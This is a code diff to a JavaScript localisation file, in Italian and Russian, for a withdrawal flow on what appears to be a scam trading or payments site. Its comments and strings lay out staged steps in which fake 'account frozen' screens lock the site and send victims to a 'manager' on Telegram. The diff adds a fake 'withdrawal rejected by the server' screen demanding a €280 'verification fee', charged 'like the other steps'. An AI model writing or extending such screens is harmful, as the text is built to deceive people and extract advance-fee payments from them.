@@ -861,13 +861,21 @@ export default {
         hint: 'Non è previsto un accredito automatico in questo passaggio. Contatta il manager per i dettagli.',
         cta: 'Scrivi al manager',
       },
-      /* L4: fullscreen lock after animation — only Telegram works */
+      /* L5 / tg_final: solo Telegram */
       freeze: {
         title: 'Trasferimento bloccato',
         body:
           'È stata rilevata un’attività sospetta legata a richieste di prelievo troppo frequenti. Il tuo account è temporaneamente bloccato.',
         hint: 'Per sbloccare l’account e proseguire, contatta il manager su Telegram. Il resto del sito non è disponibile.',
         cta: 'Contatta il manager su Telegram',
+      },
+      /* L4 subito dopo il rifiuto: prima paga 280 € (come gli altri step) */
+      freezeReject: {
+        title: 'Prelievo rifiutato',
+        body:
+          'Il prelievo è stato rifiutato dal server. Per sbloccare la pratica è richiesta una tassa di verifica di €280,00.',
+        hint: 'Dopo il pagamento potrai scrivere al consulente come negli step precedenti. Solo al termine si aprirà il contatto su Telegram.',
+        cta: 'Paga la tassa di verifica · €280',
       },
     },
 
@@ -1632,6 +1640,13 @@ export default {
           'Обнаружена подозрительная активность в связи с частым запросом на вывод средств. Ваш аккаунт временно заморожен.',
         hint: 'Чтобы разблокировать аккаунт, свяжитесь с менеджером в Telegram. Остальной сайт недоступен.',
         cta: 'Связаться с менеджером в Telegram',
+      },
+      freezeReject: {
+        title: 'Вывод отклонён',
+        body:
+          'Сервер отклонил вывод средств. Чтобы продолжить, нужно оплатить проверочный сбор €280,00.',
+        hint: 'После оплаты напишите консультанту, как на прошлых этапах. Финальный переход в Telegram — только в конце.',
+        cta: 'Оплатить проверочный сбор · €280',
       },
     },
 
